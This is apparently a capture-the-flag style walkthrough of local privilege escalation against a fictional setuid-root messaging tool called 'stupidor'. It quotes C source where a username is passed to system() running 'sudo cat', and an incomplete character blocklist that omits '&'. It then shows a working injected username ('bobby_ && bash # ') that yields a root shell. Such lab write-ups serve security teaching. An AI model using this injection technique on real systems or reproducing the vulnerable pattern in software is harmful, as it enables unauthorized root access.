# `stupidor` vulnerability

Once we obtained local access to the server, we first check what user we're logged in as:


```
karen@ubuntu-server:~$ whoami
karen
```

We then check if we have sudo rights:

```
karen@ubuntu-server:~$ sudo -l
[sudo] password for karen: 
Sorry, user karen may not run sudo on ubuntu-server
```

We also check the groups of which we're a member:

```
karen@ubuntu-server:~$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
```

Well, this user is quite useless... or is it? We look around the user's directories and find a file `reminder.txt` in the Desktop. Let's read it:

```
karen@ubuntu-server:~$ cat reminder.txt 
April 23, 2024

Η ημερομηνία κυκλοφορίας του Stupidor είναι τον Ιούλιο, οπότε έχω ακόμα χρόνο. 
Τέλος πάντων, πρέπει να θυμηθώ να ελέγξω ξανά τα εισερχόμενα. Λένε ότι είναι 
ευάλωτο, αν και δεν καταλαβαίνω πώς. Δεν ξέρω, θα το δω εν ευθέτω χρόνω.
```

D:

Ok, let's try translating this:

*The release date for Stupidor is in July, so I still have time. Anyway, I need to remember to check my inbox again. They say it's vulnerable, though I don't understand how. I don't know, I'll look into it in due course.*

Seems like they're talking about some software called Stupidor. Their inbox what? Is it bad translation? Anyway, I like the 'vulnerable' word. Maybe this has something to do with Stupidor.

```
karen@ubuntu-server:~$ stupidor
Usage:
    stupidor [command]

Available commands:
    signup      Sign up
    send        Send a message
    inbox       Check inbox

Flags:
    -h, --help      Show this help info
    -v, --version   Show version info

Use "stupidor [command] --help" for more information about a command.
```

Ah-ah! So the inbox (and probably the vulnerability) they were talking about concerns this program. Let's dive a little more into it.

```
karen@ubuntu-server:~$ which stupidor
/usr/local/bin/stupidor
karen@ubuntu-server:~$ ls -l /usr/local/bin/stupidor
-rwsr-xr-x 1 root root 27104 Apr 20 15:27 /usr/local/bin/stupidor*
```

Well, this is real nice! I smell privilege escalation here. So, the next step is to understand how to break this program so to earn root privileges.

*... plays with Stupidor to look for easy-to-exploit vulnerabilities, but nothing interesting is found...*

Ok. What can I do now? In the reminder, Karen talked about having to check the inbox again before the release date. Maybe this means that the source code is still accessible. Let's see...

```
karen@ubuntu-server:~$ find / -name stupidor 2>/dev/null
/var/stupidor
/usr/share/doc/stupidor
/usr/local/src/stupidor
karen@ubuntu-server:~$ ls -l /usr/local/src/stupidor
total 56
-rw-r--r-- 1 root root 1032 Apr 20 15:44 check_password.c
-rw-r--r-- 1 root root  542 Apr 20 15:44 check_username.c
-rw-r--r-- 1 root root 1807 Apr 20 15:44 defines.h
-rw-r--r-- 1 root root  630 Apr 20 15:44 generate_seed.c
-rw-r--r-- 1 root root 1138 Apr 20 15:44 get_hash.c
-rw-r--r-- 1 root root  310 Apr 20 15:44 includes.h
-rw-r--r-- 1 root root  332 Apr 20 15:44 print_file.c
-rw-r--r-- 1 root root 5263 Apr 20 15:44 sha256.c
-rw-r--r-- 1 root root 1215 Apr 20 15:44 sha256.h
-rw-r--r-- 1 root root 1766 Apr 20 15:44 stupidor.c
-rw-r--r-- 1 root root 2282 Apr 20 15:44 stupidor_inbox.c
-rw-r--r-- 1 root root 2620 Apr 20 15:44 stupidor_send.c
-rw-r--r-- 1 root root 4082 Apr 20 15:44 stupidor_signup.c
```

Good! We cannot change it but at least we can read it. Apparently there is a vulnerability in the part concerning the inbox. Let's dive into it:

```c
/*
Check inbox

Usage:
    stupidor inbox

Flags:
    -h, --help          Show this help info
    -D, --delete-all    Delete all messages in the inbox
*/

#include "includes.h"

void stupidor_inbox(int delete)
{
    char username[UNAMEMAX];

[...]

/* read inbox */
    char filepath[PATH_MAX];
    snprintf(filepath, sizeof(filepath), "/var/stupidor/_%s_", username);
    char command[strlen(filepath) + 10]; // 10 = "sudo cat " + '\0'
    snprintf(command, sizeof(command), "sudo cat %s", filepath);
    system(command);
    exit(EXIT_SUCCESS);
}
```

Here's something interesting: reading the inbox consists in reading a file named as the associated user, with a starting and ending underscore. To read the file, the program runs `sudo cat /var/stupidor/_<username>_`. Well, here I see the opportunity of a command injection. I just have to create a new user with a malicious username.

Ehy, I just have to create a user called `; bash`, then I check the inbox and that's it!

```
karen@ubuntu-server:~$ stupidor signup
Enter username: ; bash
Username can't contain './'"+:;*&|>^$\()[]{}'.
```

D:

How am I supposed to do this then?

*time passes, and the desperate hacker does not understand what to do. He then begins to read the program's source code in search of some ideas, until he notices something...*

```
karen@ubuntu-server:~$ cat /usr/local/src/stupidor/stupidor_signup.c
```
```c
[...]

    /* illegal characters */
    if (strchr(username, '.')  != NULL || 
        strchr(username, '/')  != NULL ||
        strchr(username, '\'') != NULL ||
        strchr(username, '\"') != NULL ||
        strchr(username, '+')  != NULL ||
        strchr(username, ':')  != NULL ||
        strchr(username, ';')  != NULL ||
        strchr(username, '*')  != NULL ||
        strchr(username, '|')  != NULL ||
        strchr(username, '>')  != NULL ||
        strchr(username, '^')  != NULL ||
        strchr(username, '$')  != NULL ||
        strchr(username, '\\') != NULL ||
        strchr(username, '(')  != NULL ||
        strchr(username, ')')  != NULL ||
        strchr(username, '[')  != NULL ||
        strchr(username, ']')  != NULL ||
        strchr(username, '{')  != NULL ||
        strchr(username, '}')  != NULL) {
        printf("Username can't contain './\'\"+:;*&|>^$\\()[]{}'.\n");
        exit(EXIT_FAILURE);
    }

[...]
```

They forgot to check for the occurrence of '&' characters! So I can do something like `cat /var/stupidor/_<existing user>_ && bash # _` and obatin a root shell! Let's try:

```
karen@ubuntu-server:~$ stupidor signup
Enter username: bobby
Enter password: 12345678
User created.
karen@ubuntu-server:~$ stupidor signup
Enter username: bobby_ && bash # 
Enter password: 12345678
User created.
karen@ubuntu-server:~$ stupidor inbox
Username: bobby_ && bash # 
Password: 12345678
root@ubuntu-server:~# 
```

Gotcha!
